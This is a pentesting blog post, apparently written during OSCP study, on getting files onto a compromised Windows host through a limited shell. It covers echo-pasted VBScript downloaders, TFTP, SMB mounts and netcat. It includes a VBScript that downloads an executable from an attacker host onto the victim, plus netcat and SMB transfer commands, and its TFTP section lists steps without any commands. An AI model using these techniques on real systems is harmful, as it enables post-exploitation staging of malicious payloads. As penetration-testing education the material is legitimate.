---
layout: post
title: "4 Ways to Transfer Files With a Limited Shell"
date: 2017-04-22 08:42:48
image: '/assets/img/'
description: How I transfer files to a windows host with limited shell
tags: oscp HowTo
categories: OSCP Research
twitter_text: Transfering Files With a Limited Shell
---

Commonly during pentests I might be stuck on getting a file over to a system with only a limited shell. To be honest, this problem has mostly occurred to me on Windows so the solutions below will all work on Windows.

# Echo One Line at a Time

The first method is to prefix the “echo” command to the beginning of each line and redirect the output to a file. You would then be able to simply paste the script into the limited shell and your file will be transferred. This method would really only be useful to transfer ASCII only files. However, you would be able to transfer a vbscript of PowerShell file to the victim and then use that to download the actual file.

For example, the following script:

```VB.net
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://10.0.0.100/file.exe", False
xHttp.Send
with bStrm
    .type = 1 '
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\admin\Desktop\file.exe", 2 '
end with
```

Would get “echo” prefixed and “>> down.vbs” appended using the following commands:

```bash
sed -i -e 's/$/echo /' down.vbs
sed -i -e 's/$/ \>\> down.vbs/' down.vbs
```

Make sure there are no empty spaces or you will get “ECHO is on.” added into your output. All that is left is to paste your script into your shell and viola! You have transferred a file.

Another option to transfer a non-ascii file is to encode it, transfer it using the echo method, and decode it on the other side but I prefer loading a downloader.

You can also use this method if you have limited RCE through a web application and use Burp’s intruder to run the commands. If you decide to go down this route, make sure that you throttle intruder so that the “echo” commands do not run out of order.

# TFTP

Another other option is to start up a TFTP server and use windows native TFTP client to connect to your server. Note that only Windows XP had tftp enabled by default. Windows Vista to Windows 10 all need to be enabled.
On the server
Set up the folder:
Start the server:
Move your file:
On the Client
Download the file:

# SMB Mount

The next option would be to set up an SMB share on a server (Could be on your kali box or another windows server in the network that has already been compromised). You can mount the SMB share to the Windows victim using the following command:

```bat
net use Z: \\host\share /PERSISTENT:YES
```

# Netcat

This one is the classic use of the nc command. Obviously, this would only work if you already have nc or ncat installed on the windows host, but hey, maybe you got lucky. 
On the host you are trying to transfer to run:

```bash
nc –l –p 3000 > file_name
```
On the host you are trying to transfer from run:

```bash
nc ipOrHostname 3000 < file_name
```
